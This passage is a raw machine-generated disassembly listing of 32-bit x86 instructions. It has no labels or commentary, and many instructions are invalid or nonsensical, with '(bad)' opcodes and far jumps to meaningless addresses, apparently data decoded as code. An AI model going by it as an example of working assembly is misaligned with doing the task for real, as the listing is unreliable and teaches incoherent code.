  40fc5b:	mov    ch,0xd0
  40fc5d:	aad    0x2d
  40fc5f:	pop    ss
  40fc60:	jmp    0x40fcd9
  40fc62:	xchg   ebx,eax
  40fc63:	sahf   
  40fc64:	pop    eax
  40fc65:	jo     0x40fc1c
  40fc67:	cmp    DWORD PTR [esi+0x3f1cbdbb],edi
  40fc6d:	rcl    BYTE PTR ds:0x55464b36,cl
  40fc73:	and    cl,ch
  40fc75:	int    0xb0
  40fc77:	mov    al,0xe6
  40fc79:	mov    ds:0x84f2f325,al
  40fc7e:	js     0x40fc30
  40fc80:	(bad)  
  40fc81:	cmp    eax,0x7bee7c8b
  40fc86:	mov    DWORD PTR [ebx+ecx*8+0x612731d6],ebp
  40fc8d:	iret   
  40fc8e:	(bad)  
  40fc8f:	enter  0x729f,0xfd
  40fc93:	dec    esp
  40fc94:	ret    
  40fc95:	mov    bl,0xe9
  40fc97:	(bad)  
  40fc98:	das    
  40fc99:	retf   0x2a09
  40fc9c:	mov    ds:0xb8d44cd7,eax
  40fca1:	xor    eax,0x59624135
  40fca6:	or     edx,0xc39893bd
  40fcac:	jmp    0xf133:0xb2444b9d
  40fcb3:	or     eax,0x55857b0d
  40fcb8:	or     al,0x12
  40fcba:	push   cs
  40fcbb:	aas    
  40fcbc:	mov    ebp,0x69c6f539
  40fcc1:	cli    
  40fcc2:	repz mov bh,BYTE PTR [ebp+0x7d]
  40fcc6:	sbb    BYTE PTR [edi+0x11010f25],0xd0
  40fccd:	lods   al,BYTE PTR ds:[esi]
  40fcce:	addr16 retf 0x983
  40fcd2:	inc    ecx
  40fcd3:	fld    QWORD PTR [ebp+ebp*8+0x3f]
  40fcd7:	jmp    0x40fcb9
  40fcd9:	cmp    ecx,DWORD PTR [esi]
  40fcdb:	test   eax,0xf1e7dcf0
  40fce0:	mov    dl,0x3f
  40fce2:	pop    eax
  40fce3:	dec    eax
  40fce4:	add    esp,0x24117b3c
  40fcea:	out    0xd3,al
  40fcec:	xchg   DWORD PTR [ebx],ecx
  40fcee:	jmp    0x1c811a51
  40fcf3:	(bad)  
  40fcf4:	scas   al,BYTE PTR es:[edi]
  40fcf5:	pop    ecx
  40fcf6:	jg     0x40fcb3
  40fcf8:	sbb    BYTE PTR [esi-0x4f],ch
  40fcfb:	inc    esi
  40fcfc:	push   eax
  40fcfd:	mov    ecx,0x9e1e4855
  40fd02:	jne    0x8a00513a
  40fd08:	xchg   esi,eax
  40fd09:	adc    al,0x72
  40fd0b:	not    BYTE PTR [edi+edx*8-0x84c8c37]
  40fd12:	xchg   ebx,eax
  40fd13:	mov    edx,0xae700ada
  40fd18:	ja     0x40fd24
  40fd1a:	clc    
  40fd1b:	(bad)  
  40fd1c:	pop    edx
  40fd1d:	mov    ebx,0x9a243e1f
  40fd22:	adc    dh,BYTE PTR [eax]
  40fd24:	and    al,0xd7
  40fd26:	xor    DWORD PTR [ebx],esp
  40fd28:	push   ebp
  40fd29:	test   BYTE PTR [edx+0x100de535],cl
  40fd2f:	adc    eax,0xfb848c4f
  40fd34:	sbb    al,0x1a
  40fd36:	or     bl,0xb0
  40fd39:	and    BYTE PTR [edi],bl
  40fd3b:	repz add eax,0x7b06fb53
  40fd41:	into   
  40fd42:	ss adc al,bl
  40fd45:	mov    bh,0xe1
  40fd47:	adc    dl,ah
  40fd49:	imul   ebp,DWORD PTR [edi-0x14],0xc7ec25fe
  40fd50:	add    BYTE PTR [ecx-0x35907762],ch
  40fd56:	pusha  
  40fd57:	push   ds
  40fd58:	xchg   ebp,eax
  40fd59:	aaa    
  40fd5a:	jae    0x40fdbb
  40fd5c:	mov    ebx,0x11dfe1c6
  40fd61:	push   ebp
  40fd62:	and    DWORD PTR [eax-0x47028454],esp
  40fd68:	add    dl,BYTE PTR [eax-0x47]
  40fd6b:	xlat   BYTE PTR ds:[ebx]
  40fd6c:	cli    
  40fd6d:	mov    eax,ds:0x51697577
  40fd72:	cmc    
  40fd73:	push   esp
  40fd74:	inc    ebx
  40fd75:	ret    0x2ffa
  40fd78:	fcomp  DWORD PTR [esi]
  40fd7a:	stc    
  40fd7b:	call   0x9972:0xcf4e04b3
  40fd82:	nop
  40fd83:	sub    al,bl
  40fd85:	jnp    0x40fde7
  40fd87:	add    ebx,DWORD PTR [esi+0x5e67320a]
  40fd8d:	ja     0x40fd49
  40fd8f:	out    dx,eax
  40fd90:	stos   DWORD PTR es:[edi],eax
  40fd91:	pusha  
  40fd92:	sbb    BYTE PTR [ecx],bl
  40fd94:	push   0xffffffc1
  40fd96:	dec    esi
  40fd97:	popf   
  40fd98:	mov    esi,0x15f76227
  40fd9d:	clc    
  40fd9e:	(bad)  
  40fd9f:	mov    al,ds:0xb2442720
  40fda4:	pop    edi
  40fda5:	stc    
  40fda6:	and    DWORD PTR [edi-0x3ff50ddb],0x43b90489
  40fdb0:	cdq    
  40fdb1:	dec    ecx
  40fdb2:	dec    ebp
  40fdb3:	std    
  40fdb4:	(bad)  
  40fdb5:	fsubr  DWORD PTR [esi-0x79]
  40fdb8:	sbb    dh,bh
  40fdba:	adc    DWORD PTR [eax+ebx*2-0x6f],eax
  40fdbe:	mov    eax,0xcd66fbb2
  40fdc3:	test   BYTE PTR [esi+edi*4-0xa1b37cf],0xa0
  40fdcb:	and    DWORD PTR [eax],eax
  40fdcd:	fnstsw WORD PTR [ebp-0x34]
  40fdd0:	sbb    eax,0x27b77ebe
  40fdd5:	cmp    BYTE PTR [ebx+eax*8-0x495e27a],dh
  40fddc:	mov    bl,0xad
  40fdde:	mov    ebp,0x4eb3964d
  40fde3:	inc    edi
  40fde4:	popa   
  40fde5:	cld    
  40fde6:	(bad)  
  40fde7:	shr    BYTE PTR ds:0x62502d5a,cl
  40fded:	adc    DWORD PTR [ecx-0x1c7963da],ebx
  40fdf3:	stos   DWORD PTR es:[edi],eax
  40fdf4:	rol    bl,cl
  40fdf6:	ins    DWORD PTR es:[edi],dx
  40fdf7:	jmp    0xd96b:0x7c611d34
  40fdfe:	mov    ecx,ecx
  40fe00:	xlat   BYTE PTR ds:[ebx]
  40fe01:	inc    edi
  40fe02:	push   0xf59d302
  40fe07:	ret    0x953e
  40fe0a:	pop    esp
  40fe0b:	lods   eax,DWORD PTR ds:[esi]
  40fe0c:	mov    ecx,0x653ceee4
  40fe11:	(bad)  
  40fe12:	retf   
  40fe13:	sbb    eax,0x70945c58
  40fe18:	ret    0xa3ed
  40fe1b:	mov    ds:0xaa03246e,eax
  40fe20:	hlt    
  40fe21:	mov    WORD PTR [esi-0x5a],gs
  40fe24:	test   al,0x9f
  40fe26:	or     al,0xee
  40fe28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe29:	mov    bl,0x22
  40fe2b:	les    eax,FWORD PTR [edx+edx*8]
  40fe2e:	jp     0x40fdb8
  40fe30:	jg     0x40feae
  40fe32:	dec    edi
  40fe33:	in     eax,dx
  40fe34:	jmp    0xecd1:0xa6540f0a
  40fe3b:	rcr    DWORD PTR [eax-0x63],0x65
  40fe3f:	rcr    BYTE PTR [ebx+0x53],1
  40fe42:	rep stos DWORD PTR es:[edi],eax
  40fe44:	add    eax,0xca7f16ac
  40fe49:	dec    esi
  40fe4a:	loope  0x40fdf2
  40fe4c:	lock loopne 0x40fea2
  40fe4f:	mov    ebp,0x3987b927
  40fe54:	push   eax
  40fe55:	or     esp,DWORD PTR [eax]
  40fe57:	add    dh,BYTE PTR [eax+0x5d]
  40fe5a:	mov    ch,0x9c
  40fe5c:	and    al,0x2
  40fe5e:	cli    
  40fe5f:	mov    BYTE PTR ds:0x9c3e017d,bl
  40fe65:	dec    esi
  40fe66:	jno    0x40fde8
  40fe68:	les    ecx,FWORD PTR [edx]
  40fe6a:	inc    ebp
  40fe6b:	mov    edx,esp
  40fe6d:	or     bl,BYTE PTR ds:0x2199b0a8
  40fe73:	pop    ds
  40fe74:	outs   dx,BYTE PTR ds:[esi]
  40fe75:	fistp  WORD PTR [edx-0x572661a3]
  40fe7b:	shl    DWORD PTR [edi+0x3e],0xb2
  40fe7f:	cmp    BYTE PTR [esi],0x52
  40fe82:	cmc    
  40fe83:	sub    eax,0x2aed9d1
  40fe88:	inc    ebp
  40fe89:	mov    edi,0xd1b73bb4
  40fe8e:	sbb    DWORD PTR ds:[ebp+0xa9ebdbe],ecx
  40fe95:	mov    ds:0xe1d243e7,eax
  40fe9a:	outs   dx,BYTE PTR ds:[esi]
  40fe9b:	out    0xe9,eax
  40fe9d:	outs   dx,DWORD PTR ds:[esi]
  40fe9e:	fsub   DWORD PTR [esi-0x1079b73d]
  40fea4:	mov    WORD PTR [edi+0x47835670],cs
  40feaa:	mov    ecx,0x4593811b
  40feaf:	or     al,0x81
  40feb1:	jnp    0x40fed9
  40feb3:	sbb    DWORD PTR [edi+0x6b],ecx
  40feb6:	dec    ebp
  40feb7:	add    eax,DWORD PTR [esi]
  40feb9:	pop    esi
  40feba:	jp     0x40fe54
  40febc:	(bad)  
  40febd:	fcom   QWORD PTR [eax-0x38df01ac]
  40fec3:	test   al,0x4a
  40fec5:	je     0x40fecf
  40fec7:	mov    ah,0xc1
  40fec9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40feca:	cld    
  40fecb:	mov    dh,0x1d
  40fecd:	dec    esi
  40fece:	ret    
  40fecf:	inc    ebp
  40fed0:	out    0x2b,eax
  40fed2:	jecxz  0x40fe64
  40fed4:	fsub   QWORD PTR [eax+0x3a572b07]
  40feda:	loop   0x40feac
  40fedc:	(bad)  
  40fedd:	frstor [ecx+0x4f]
  40fee0:	cmp    al,0x8f
  40fee2:	fsubr  QWORD PTR [esi]
  40fee4:	stc    
  40fee5:	or     BYTE PTR ds:0xd79781b7,al
  40feeb:	push   es
  40feec:	xchg   ebx,eax
  40feed:	dec    esp
  40feee:	push   ecx
  40feef:	retf   
  40fef0:	adc    al,0xf8
  40fef2:	fs push ebp
  40fef4:	cmp    dh,BYTE PTR [ecx+0x6f]
  40fef7:	mov    ebp,0xa275a918
  40fefc:	mov    ds,ebx
  40fefe:	test   al,0xf0
  40ff00:	aas    
  40ff01:	pusha  
  40ff02:	cmp    ebx,DWORD PTR [eax]
  40ff04:	push   es
  40ff05:	jnp    0x40fead
  40ff07:	mov    esp,0xbb04b0e7
  40ff0c:	test   al,0xc5
  40ff0e:	sub    al,0xa9
  40ff10:	jmp    0x40fee7
  40ff12:	sti    
  40ff13:	pop    esi
  40ff14:	pop    ss
  40ff15:	adc    BYTE PTR es:[edi+0x23e19237],al
  40ff1c:	push   0x7f
  40ff1e:	pop    ds
  40ff1f:	jl     0x40ff59
  40ff21:	cmp    al,BYTE PTR [ebp+0x38]
  40ff24:	cmp    eax,0x96587f32
  40ff29:	rol    DWORD PTR [ebx-0x29332502],1
  40ff2f:	and    esi,DWORD PTR [ebx-0x2c]
  40ff32:	mov    bl,0xa4
  40ff34:	ret    
  40ff35:	and    edx,esp
  40ff37:	nop
  40ff38:	int    0xf2
  40ff3a:	mov    eax,ds:0xb52a878f
  40ff3f:	adc    DWORD PTR [esi],eax
  40ff41:	dec    edi
  40ff42:	fdivp  st(4),st
  40ff44:	fwait
  40ff45:	mov    ebx,0xb81d2efa
  40ff4a:	or     BYTE PTR [eax],0x34
  40ff4d:	dec    esi
  40ff4e:	xchg   ebx,eax
  40ff4f:	push   cs
  40ff50:	lock lock aad 0x7c
  40ff54:	cdq    
  40ff55:	mov    esi,0xcb271c69
  40ff5a:	inc    ch
  40ff5c:	sub    DWORD PTR [ecx-0x5a640a86],0x13
  40ff63:	rol    DWORD PTR [ecx],0xb3
  40ff66:	out    dx,al
  40ff67:	scas   eax,DWORD PTR es:[edi]
  40ff68:	sub    al,0xfe
  40ff6a:	push   esi
  40ff6b:	xor    al,0xd8
  40ff6d:	ficom  WORD PTR [edi+0x1c532939]
  40ff73:	xlat   BYTE PTR ds:[ebx]
  40ff74:	fimul  WORD PTR [ebx+edi*4-0x114e5989]
  40ff7b:	imul   edx,DWORD PTR [edx-0x7f552e8c],0xffffffac
  40ff82:	xor    eax,0xf8d804ca
  40ff87:	jno    0x40ff61
  40ff89:	int3   
  40ff8a:	mov    edx,0x7bd23722
  40ff8f:	fs xchg ecx,eax
  40ff91:	mov    eax,ds:0x81e32136
  40ff96:	jmp    0xbdb7:0xf61d8dd5
  40ff9d:	ret    
  40ff9e:	jnp    0x40ffcc
  40ffa0:	imul   esi,DWORD PTR fs:[esi],0xfffffff1
  40ffa4:	cmc    
  40ffa5:	mov    ds:0xc61e9aab,eax
  40ffaa:	dec    ebp
  40ffab:	mov    eax,0x7ef4e609
  40ffb0:	scas   eax,DWORD PTR es:[edi]
  40ffb1:	dec    eax
  40ffb2:	std    
  40ffb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffb4:	or     eax,DWORD PTR [edx]
  40ffb6:	sub    eax,0x6a4daa86
  40ffbb:	nop
  40ffbc:	inc    ebx
  40ffbd:	xlat   BYTE PTR ds:[ebx]
  40ffbe:	sub    edi,esi
  40ffc0:	das    
  40ffc1:	and    DWORD PTR [ebx+0x273d9441],0xffffffc9
  40ffc8:	add    DWORD PTR [ecx],esi
  40ffca:	jle    0x410018
  40ffcc:	cmp    BYTE PTR [ebx+esi*8],ah
  40ffcf:	push   ebx
  40ffd0:	adc    al,0x86
  40ffd2:	sti    
  40ffd3:	inc    edx
  40ffd4:	and    eax,0x621e0d9e
  40ffd9:	(bad)  
  40ffda:	sti    
  40ffdb:	xchg   ebx,eax
  40ffdc:	adc    BYTE PTR [edx],dh
  40ffde:	cwde   
  40ffdf:	ret    0x5336
  40ffe2:	xor    al,0x7a
  40ffe4:	jnp    0x40ffac
  40ffe6:	loop   0x41005c
  40ffe8:	xor    al,BYTE PTR [ebp+0x3f]
  40ffeb:	fdivr  st,st(2)
  40ffed:	icebp  
  40ffee:	mul    BYTE PTR [esi+0x7adcfc7b]
  40fff4:	imul   edi,ebx,0x34
  40fff7:	mov    al,0x22
  40fff9:	cmovp  esp,DWORD PTR [edx]
  40fffc:	aad    0xc1
  40fffe:	fs push ecx
  410000:	sbb    esp,ebx
  410002:	inc    edx
  410003:	mov    ds:0x2ce05373,eax
  410008:	call   DWORD PTR [edx+0x5f]
  41000b:	cpuid  
  41000d:	enter  0xb856,0xcd
  410011:	pop    ebx
  410012:	sbb    al,0x16
  410014:	xlat   BYTE PTR ds:[ebx]
  410015:	cmc    
  410016:	imul   eax,DWORD PTR [ecx+0x7e],0xfffffffb
  41001a:	scas   al,BYTE PTR es:[edi]
  41001b:	loope  0x410090
  41001d:	jmp    0x3692:0x128fdb75
  410024:	jae    0x40ffcc
  410026:	mov    WORD PTR [edx],fs
  410028:	push   ds
  410029:	inc    ebp
  41002a:	out    dx,eax
  41002b:	sar    DWORD PTR [ecx+0x8],0x2e
  41002f:	iret   
  410030:	clc    
  410031:	popf   
  410032:	mov    edx,0x7b03a205
  410037:	(bad)
  41003c:	adc    BYTE PTR [ecx],cl
  41003e:	retf   
  41003f:	jno    0x410086
  410041:	lods   eax,DWORD PTR ds:[esi]
  410042:	lock add eax,0xdbd6f1f
  410048:	sub    DWORD PTR [ebx],eax
  41004a:	retf   0x2076
  41004d:	sbb    BYTE PTR [ebp-0xc91505],ch
  410053:	(bad)  
  410054:	repz adc DWORD PTR [esi-0x1],ebp
  410058:	or     BYTE PTR [esp+esi*1-0x54d14b9d],ah
  41005f:	lea    ecx,[ebp+ebp*2-0x1f7a2eea]
  410066:	push   ebx
  410067:	push   edi
  410068:	mov    ds:0x43afa5e4,eax
  41006d:	dec    edx
  41006e:	dec    ebx
  41006f:	ins    BYTE PTR es:[edi],dx
  410070:	pushf  
  410071:	pop    ecx
  410072:	shr    DWORD PTR [ebx+ebx*1],1
  410075:	xchg   edi,eax
  410076:	xor    bh,al
  410078:	in     eax,0xe9
  41007a:	cmc    
  41007b:	aam    0xc5
  41007d:	or     eax,0x91157c81
  410082:	daa    
  410083:	jo     0x410026
  410085:	enter  0xb4a1,0xb0
  410089:	mov    dl,0x1b
  41008b:	mov    edi,0x33af02d0
  410090:	loopne 0x410063
  410092:	std    
  410093:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410094:	mov    esi,esp
  410096:	sbb    DWORD PTR [edx+0x1497aeaf],ecx
  41009c:	sar    bl,cl
  41009e:	js     0x410044
  4100a0:	mov    DWORD PTR [edx],edx
  4100a2:	adc    ecx,DWORD PTR [edx+0x71cc3c5]
  4100a8:	inc    eax
  4100a9:	test   DWORD PTR [esi-0xe941529],edi
  4100af:	rcr    BYTE PTR ds:0x5c662f78,1
  4100b5:	add    al,0x79
  4100b7:	int3   
  4100b8:	int    0x3b
  4100ba:	in     eax,dx
  4100bb:	jp     0x410053
  4100bd:	adc    al,0xcd
  4100bf:	(bad)  
  4100c0:	(bad)  
  4100c2:	lods   eax,DWORD PTR ds:[esi]
  4100c3:	data16 loope 0x41012d
  4100c6:	clc    
  4100c7:	mov    ds:0x92614989,eax
  4100cc:	out    0x21,eax
  4100ce:	add    eax,0x3617571
  4100d3:	mov    ecx,0x6e5564d4
  4100d8:	sub    al,0x5f
  4100da:	popa   
  4100db:	push   es
  4100dc:	(bad)  
  4100de:	sbb    BYTE PTR [edx+0x2d76a478],bl
  4100e4:	fsub   QWORD PTR [esi+0x2f]
  4100e7:	xor    eax,0x31f8f723
  4100ec:	mov    BYTE PTR [esi-0x5d71acad],bl
  4100f2:	dec    ebx
  4100f3:	xchg   esi,eax
  4100f4:	aaa    
  4100f5:	mov    edi,0x329e5f16
  4100fa:	ja     0x4100f3
  4100fc:	out    0x3a,al
  4100fe:	jmp    0x50400aa1
  410103:	inc    eax
  410104:	jl     0x41012f
  410106:	cwde   
  410107:	popa   
  410108:	push   ss
  410109:	mov    WORD PTR [edi+0x8],?
  41010c:	cmp    al,0x85
  41010e:	inc    ebp
  41010f:	je     0x410097
  410111:	aam    0xc1
  410113:	or     DWORD PTR [eax],edx
  410115:	add    BYTE PTR [eax],dl
  410117:	mov    ebx,0xe6c56885
  41011c:	add    eax,0xd7f7dd5c
  410121:	std    
  410122:	dec    edi
  410123:	imul   edx,DWORD PTR [edi],0x965e4b9
  410129:	aam    0xf6
  41012b:	jl     0x410187
  41012d:	adc    al,BYTE PTR ds:[ebp-0x1fe5ec29]
  410134:	sbb    BYTE PTR [esp+esi*4-0x65],bh
  410138:	aad    0x61
  41013a:	aam    0xb0
  41013c:	sub    DWORD PTR [edi-0x5f],edx
  41013f:	or     DWORD PTR [ebx+0x3a],eax
  410142:	jmp    0x410106
  410144:	pop    ebx
  410145:	fidivr DWORD PTR [ebp-0x6ea44e06]
  41014b:	dec    bl
  41014d:	xor    DWORD PTR [edx-0x4b982bc1],esi
  410153:	sbb    al,BYTE PTR [esi]
  410155:	mov    al,0xe8
  410157:	pusha  
  410158:	xchg   esp,eax
  410159:	mov    esp,0xeeb8e7e8
  41015e:	stos   DWORD PTR es:[edi],eax
  41015f:	loop   0x410182
  410161:	imul   ebp,DWORD PTR [edx-0xc1602a9],0x741ef5fb
  41016b:	fadd   st(4),st
  41016d:	xor    cl,BYTE PTR [ebx+0x7f20ccd]
  410173:	xchg   esi,eax
  410174:	inc    ebp
  410175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410176:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410177:	sbb    eax,0x59636714
  41017c:	imul   ebx,esp,0x38fa20f5
  410182:	xor    eax,0x3c1ddc5e
  410187:	pusha  
  410188:	xchg   ebx,eax
  410189:	push   eax
  41018a:	in     eax,dx
  41018b:	dec    ebp
  41018c:	jb     0x410174
  41018e:	shl    DWORD PTR [edi+0x41],1
  410191:	cwde   
  410192:	retf   
  410193:	pop    ebx
  410194:	(bad)  
  410195:	sbb    ch,BYTE PTR [ebp+0x3c8f3d00]
  41019b:	pop    edi
  41019c:	push   0x2611c258
  4101a1:	out    0xa4,al
  4101a3:	in     eax,dx
  4101a4:	ds fwait
  4101a6:	and    eax,0x515023a8
  4101ab:	cld    
  4101ac:	add    BYTE PTR [ebp+edi*8-0x54],dh
  4101b0:	inc    eax
  4101b1:	push   0xe21eb1fb
  4101b6:	sbb    ecx,ebx
  4101b8:	adc    eax,DWORD PTR [eax+0x67]
  4101bb:	dec    edx
  4101bc:	std    
  4101bd:	cmp    ah,BYTE PTR ds:0x9a6d4988
  4101c3:	test   al,0xee
  4101c5:	bound  edi,QWORD PTR [edi+0x3d]
  4101c8:	aaa    
  4101c9:	xor    BYTE PTR [ecx+eiz*8+0x1429c029],al
  4101d0:	push   0x16
  4101d2:	jg     0x4101a8
  4101d4:	or     eax,0x8b961ec4
  4101d9:	call   0xad48:0xfc238381
  4101e0:	int    0xd9
  4101e2:	sbb    ch,BYTE PTR [esi+0x31]
  4101e5:	and    DWORD PTR [edx-0x276b0038],0x77ef3514
  4101ef:	jmp    0x96e13864
  4101f4:	mov    ds:0x3a5ede13,eax
  4101f9:	loop   0x4101e7
  4101fb:	cli    
  4101fc:	retf   0x1336
  4101ff:	(bad)  
  410201:	pop    edi
  410202:	mov    bl,0x4b
  410204:	aas    
  410205:	sub    BYTE PTR [eax],0xa2
  410208:	ins    BYTE PTR es:[edi],dx
  410209:	lods   al,BYTE PTR ds:[esi]
  41020a:	cwde   
  41020b:	add    ebx,DWORD PTR [edi+esi*2]
  41020e:	test   al,0xe2
  410211:	pop    edi
  410212:	shl    DWORD PTR [ebx-0x3f],cl
  410215:	cwde   
  410216:	xchg   ecx,eax
  410217:	mov    ch,0x4f
  410219:	push   0xffffffbc
  41021b:	scas   eax,DWORD PTR es:[edi]
  41021c:	add    DWORD PTR [ecx+0x73],ebp
  41021f:	xor    BYTE PTR [eax],ch
  410221:	fsub   DWORD PTR [ebx+0x32513c2b]
  410227:	aaa    
  410228:	dec    eax
  410229:	jecxz  0x410201
  41022b:	inc    esp
  41022c:	dec    esi
  41022d:	rcr    DWORD PTR ds:0x82147f,0xad
  410234:	es jns 0x41028d
  410237:	fst    DWORD PTR [edx-0x55]
  41023a:	adc    BYTE PTR [edx],bl
  41023c:	pop    esp
  41023d:	jno    0x4101de
  41023f:	in     eax,dx
  410240:	xor    DWORD PTR [ebx+ebp*8+0x57dce729],0xde15c8e3
  41024b:	ret    
  41024c:	dec    esi
  41024d:	push   edi
  41024e:	push   cs
  41024f:	bswap  edx
  410251:	pop    ebx
  410252:	pop    edx
  410253:	sti    
  410254:	ins    DWORD PTR es:[edi],dx
  410255:	(bad)  
  410256:	push   ss
  410257:	mov    al,0xe0
  410259:	test   BYTE PTR [ecx+esi*8],bh
  41025c:	ret    0xbeee
  41025f:	push   esi
  410260:	jo     0x41022b
  410262:	ja     0x4102b3
  410264:	sahf   
  410265:	mov    cs:0xc172c309,eax
  41026b:	mov    eax,0xfe3a0a2a
  410270:	ud1    ebp,DWORD PTR [ebp-0x69]
  410274:	ret    
  410275:	mov    bl,0xf3
  410277:	pop    esp
  410278:	fimul  WORD PTR [edx]
  41027a:	mov    BYTE PTR [esi-0x17],cl
  41027d:	adc    edi,esi
  41027f:	sahf   
  410280:	fisubr WORD PTR [esi]
  410282:	sbb    eax,ecx
  410284:	push   esi
  410285:	loop   0x410265
  410287:	fiadd  WORD PTR [edi]
  410289:	sti    
  41028a:	sbb    ah,bl
  41028c:	dec    eax
  41028d:	dec    ecx
  41028e:	out    dx,al
  41028f:	xor    DWORD PTR [ecx],0x3f
  410292:	in     eax,dx
  410293:	adc    ebp,DWORD PTR [eax+0x4]
  410296:	xor    al,0x93
  410298:	sub    al,0x98
  41029a:	loop   0x410304
  41029c:	xchg   ebp,eax
  41029d:	mov    al,BYTE PTR ds:[eax+0x4f4f198a]
  4102a4:	inc    esp
  4102a5:	cli    
  4102a6:	fnsetpm(287 only) 
  4102a8:	pop    es
  4102a9:	push   0x7b41105
  4102ae:	or     DWORD PTR [eax],ecx
  4102b0:	adc    DWORD PTR [eax],ebx
  4102b2:	cmp    eax,0x2e12e30a
  4102b7:	jo     0x4102a5
  4102b9:	push   eax
  4102ba:	mov    eax,0x1e5b1ab5
  4102bf:	shl    DWORD PTR [ebx+0xcae7ac1],0x67
  4102c6:	inc    edi
  4102c7:	jne    0x410257
  4102c9:	xor    al,0x9b
  4102cb:	jmp    0x3e95:0xe90325d4
  4102d2:	jmp    0xa7bb2085
  4102d7:	sbb    al,0x12
  4102d9:	ret    0xde61
  4102dc:	inc    edx
  4102dd:	les    ebp,FWORD PTR [ebx+0x4e]
  4102e0:	test   BYTE PTR [edx-0x706da438],cl
  4102e6:	add    DWORD PTR [esi+0x74],eax
  4102e9:	fidiv  DWORD PTR [ecx-0xa]
  4102ec:	push   esp
  4102ed:	jl     0x410322
  4102ef:	sub    esi,DWORD PTR [esi+0x7b0e5988]
  4102f5:	mov    ebp,0xa58c9b1b
  4102fa:	(bad)  
  4102fb:	fcmovnu st,st(6)
  4102fd:	xor    DWORD PTR [ecx-0xf],0xeacc6102
  410304:	pop    ebx
  410305:	xor    ah,BYTE PTR [ebx-0x71d49d67]
  41030b:	mov    ds:0x5c744500,eax
  410310:	inc    edx
  410311:	mov    dl,0x16
  410313:	xchg   BYTE PTR [esi-0x7c],cl
  410316:	aaa    
  410317:	mov    BYTE PTR [ebp-0x70],bl
  41031a:	adc    al,0x87
  41031c:	stc    
  41031d:	fidiv  DWORD PTR [ebx-0x7e97b1a7]
  410323:	hlt    
  410324:	xor    DWORD PTR [ebp+0x6fc0a912],ecx
  41032a:	and    ch,BYTE PTR [esi-0x18f1a4bd]
  410330:	jmp    0x4103aa
  410332:	fimul  WORD PTR [eax+0x228a6453]
  410338:	dec    edi
  410339:	inc    esp
  41033a:	shr    DWORD PTR [ecx],0x87
  41033d:	das    
  41033e:	xor    al,0x82
  410340:	adc    eax,0x94f91f2d
  410345:	retf   
  410346:	cmp    WORD PTR [ebx+0x3e],dx
  41034a:	jecxz  0x410368
  41034c:	aaa    
  41034d:	dec    edi
  41034e:	jmp    0xd34d:0xcedec3a8
  410355:	into   
  410356:	ins    DWORD PTR es:[edi],dx
  410357:	adc    BYTE PTR [edi+0x52],al
  41035a:	cmc    
  41035b:	jmp    0x410340
  41035d:	mov    bl,0x10
  41035f:	mov    ch,BYTE PTR [edi]
  410361:	ja     0x410359
  410363:	or     DWORD PTR [ebx],esp
  410365:	icebp  
  410366:	lods   al,BYTE PTR gs:[esi]
  410368:	stos   BYTE PTR es:[edi],al
  410369:	mov    WORD PTR [eax],ds
  41036b:	not    DWORD PTR [ebx-0x2b]
  41036e:	sub    eax,0xbf06843d
  410373:	jle    0x410372
  410375:	iret   
  410376:	cmp    BYTE PTR [ecx-0x18],al
  410379:	push   edx
  41037a:	out    0x8,eax
  41037c:	addr16 dec ecx
  41037e:	and    al,0xcf
  410380:	(bad)  [edx+0x7cf583b4]
  410386:	out    0xe9,al
  410388:	sub    BYTE PTR [ebx-0x1b],0x76
  41038c:	inc    ebp
  41038d:	sbb    dl,BYTE PTR [ecx+ecx*1]
  410390:	and    al,0x8
  410392:	(bad)  
  410393:	pop    eax
  410394:	(bad)  
  410395:	test   al,0xed
  410397:	sar    BYTE PTR [ecx-0x74f5991],0xdb
  41039e:	ret    0x343c
  4103a1:	push   eax
  4103a2:	sbb    al,0xbc
  4103a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103a5:	inc    eax
  4103a6:	sub    esp,DWORD PTR [esp+eax*1]
  4103a9:	dec    ecx
  4103aa:	sahf   
  4103ab:	lock mov al,0x2b
  4103ae:	mov    esp,0xab28e5f1
  4103b3:	out    dx,al
  4103b4:	xor    edi,esp
  4103b6:	jbe    0x41036c
  4103b8:	loope  0x41036f
  4103ba:	fisubr WORD PTR [edx+0x1bd729dd]
  4103c0:	dec    esp
  4103c1:	int    0x79
  4103c3:	pusha  
  4103c4:	dec    ecx
  4103c5:	jecxz  0x41036e
  4103c7:	je     0x4103f6
  4103c9:	mov    al,ds:0x6f969d08
  4103ce:	xlat   BYTE PTR ds:[ebx]
  4103cf:	in     eax,0xe7
  4103d1:	mov    al,0xe3
  4103d3:	add    DWORD PTR [edi+ebx*2-0x55a939da],ebx
  4103da:	pusha  
  4103db:	mov    cl,ah
  4103dd:	xor    BYTE PTR [ecx+0x1f],ah
  4103e0:	and    eax,0x71aa5c74
  4103e5:	xor    bh,BYTE PTR [edx+edi*2+0x5a]
  4103e9:	jns    0x410410
  4103eb:	aaa    
  4103ec:	ins    DWORD PTR es:[edi],dx
  4103ed:	out    0x4e,eax
  4103ef:	popa   
  4103f0:	and    BYTE PTR [eax-0x66],dl
  4103f3:	push   ecx
  4103f4:	lock mov edx,0x580d4ed7
  4103fa:	inc    ecx
  4103fb:	lahf   
  4103fc:	mov    al,0xb3
  4103fe:	(bad)  
  4103ff:	xlat   BYTE PTR ds:[ebx]
  410400:	jnp    0x4103f7
  410402:	sbb    eax,0xea0171ac
  410407:	adc    cl,dl
  410409:	jne    0x410485
  41040b:	push   edx
  41040c:	lods   eax,DWORD PTR ds:[esi]
  41040d:	fistp  QWORD PTR [esi-0x37]
  410410:	sbb    eax,0x836f488c
  410415:	xchg   edx,eax
  410416:	sub    al,0x3
  410418:	mov    ds:0xa22e0f00,al
  41041d:	test   BYTE PTR [ebp+0x42],0x56
  410421:	addr16 jbe 0x410457
  410424:	add    DWORD PTR [esp+edi*1],ebp
  410427:	push   eax
  410428:	jnp    0x410488
  41042a:	xor    eax,0x23f1cb73
  41042f:	dec    eax
  410430:	frstor [esp+esi*4]
  410433:	sti    
  410434:	out    0x5,eax
  410436:	sti    
  410437:	xor    BYTE PTR [ecx+eax*2],al
  41043a:	xchg   edi,eax
  41043b:	pop    ebp
  41043c:	loope  0x4103e3
  41043e:	push   0x6f31c66f
